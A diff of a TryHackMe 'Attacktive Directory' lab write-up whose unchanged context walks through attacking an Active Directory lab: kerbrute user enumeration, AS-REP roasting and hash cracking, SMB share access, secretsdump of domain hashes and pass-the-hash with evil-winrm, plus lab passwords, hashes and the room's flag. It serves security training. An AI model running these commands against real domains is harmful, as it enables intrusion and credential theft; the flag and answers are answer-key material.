@@ -4,7 +4,7 @@ description: https://tryhackme.com/r/room/attacktivedirectory
 
 # Attacktive Directory
 
-<div align="left"><figure><img src="../.gitbook/assets/image (30) (1) (1) (1) (1) (1).png" alt="" width="128"><figcaption><p>@TryHackMe</p></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (30) (1) (1) (1) (1) (1) (1).png" alt="" width="128"><figcaption><p>@TryHackMe</p></figcaption></figure></div>
 
 ## Task 1 - Deploy machine <a href="#task-0-deploy-machine" id="task-0-deploy-machine"></a>
 
@@ -70,7 +70,7 @@ Basic enumeration starts out with an nmap scan. Nmap is a relatively complex uti
 
 Then, we started our enumeration with a standard nmap scan: `sudo nmap -Pn -sCV ad.thm -oN open_ports`
 
-<figure><img src="../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There are the usual ports active in a windows system, in this case AD.
 
@@ -220,7 +220,7 @@ Server type string: null
 [-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
 ```
 
-<figure><img src="../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 THM-AD
@@ -230,7 +230,7 @@ THM-AD
 
 
 
-<figure><img src="../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This question is a bit generic, but reviewing the previous screen, referring to domain name: 'spookysec.local' the answer '.local' stands out.
 
@@ -302,7 +302,7 @@ yuridia youngblood whatthehell werwer victorhugo vergeten vanila uranus tyler11 
 
 We can check the list of commands using the flag --help, -h, or nothing
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 userenum
@@ -322,7 +322,7 @@ user wordlist -> userlist.txt
 ./kerbrute_linux_amd64 userenum --dc ad.thm -d spookysec.local userlist.txt   
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 svc-admin
@@ -353,7 +353,7 @@ Investigating the others result (that i'm saving into a file called user.txt)
 
 there's another that jump out to me:
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 backup
@@ -375,11 +375,11 @@ Remember:  Impacket may also need you to use a python version >=3.7. In the Atta
 
 Remembering the list of users (into file user.txt):
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 we can execute the command to obtain user accounts that don't need password to receive a ticket:
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 svc-admin
@@ -391,7 +391,7 @@ Go there: [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat
 
 Remembering the last result, the number $23 permits me to focus quickly about the answer:
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 Kerberos 5 AS-REP etype 23
@@ -401,7 +401,7 @@ Kerberos 5 AS-REP etype 23
 
 The hash-mode value the value of the first column:
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 18200
@@ -421,7 +421,7 @@ and execute Hashcat: `hashcat -m 18200 hash.txt passwordlist.txt --force`
 
 or John the ripper: `john hash.txt --wordlist=/home/kali/Documents/THM/Attacktive_Directory/passwordlist.txt`
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 management2005
@@ -437,7 +437,7 @@ We can use smbclient to enumerate smb shares
 
 `man smbclient`
 
-<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 smbclient
@@ -447,7 +447,7 @@ smbclient
 
 `man smbclient`
 
-<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There's the option/flag -L to list shares.
 
@@ -462,7 +462,7 @@ smbclient -L ad.thm -U svc-admin
 ##Insert password
 ```
 
-<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 6
@@ -472,7 +472,7 @@ smbclient -L ad.thm -U svc-admin
 
 `smbclient -U svc-admin //ad.thm/backup`
 
-<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 backup
@@ -498,7 +498,7 @@ It is encoded into Base64, than, we can easily decode it using:
 
 `base64 -d backup_credentials.txt`
 
-<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 backup@spookysec.local:backup2517860
@@ -519,7 +519,7 @@ Knowing this, we can use another tool within Impacket called "secretsdump.py". T
 \
 Check the functionality of impacket-secretsdump using the flag -h
 
-<figure><img src="../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Remembering the account credentials (backup@spookysec.local:backup2517860), there's a method that permits to extract NTDS.DIT data (NTLM Hashes) using option: `-just-dc` then, we can run it and dump secrets:
 
@@ -617,7 +617,7 @@ The question is regarding only Administrators, but we'll try to crack all.
 
 Contuining, we're interested to the NTLM hashes, let's save the result in a text file and consider the second part of the string followed by the separator: `cut -d ':' -f 4 ntlm.txt > ntlm2.txt`
 
-<figure><img src="../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The administrator NTLM hash is the first of this list:
 
@@ -631,7 +631,7 @@ A famous method of oattack that allow us to authenticate as the user wihout psw,
 
 However, we'll try to crack them using John The Ripper: `john --format=nt ntlm2.txt --wordlist=passwordlist.txt`
 
-<figure><img src="../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 but we obtained password that we just know, relative to backup and svc-admin accounts.
 
@@ -643,7 +643,7 @@ pass the hash
 
 Remembering that we've more hashes, we can use the tecniques 'pass the hash' utilizing Evil-WinRM tool, these below are its functionality:
 
-<figure><img src="../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 All right -H option, we'll test it in the next task.
 
@@ -659,7 +659,7 @@ For svc-admin account we know hash and password, we can use evil-winrm to do it 
 
 spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
 
-<figure><img src="../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Remember to remove the last three ':' of the hash.
 
@@ -697,11 +697,11 @@ In this case, we don't know password, not worry, we can use pass-the-hash and en
 
 `sudo evil-winrm -i ad.thm -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'`
 
-<figure><img src="../.gitbook/assets/image (26) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Access to it and retrieve the root.txt flag:
 
-<figure><img src="../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -711,4 +711,4 @@ TryHackMe{4ctiveD1rectoryM4st3r}
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
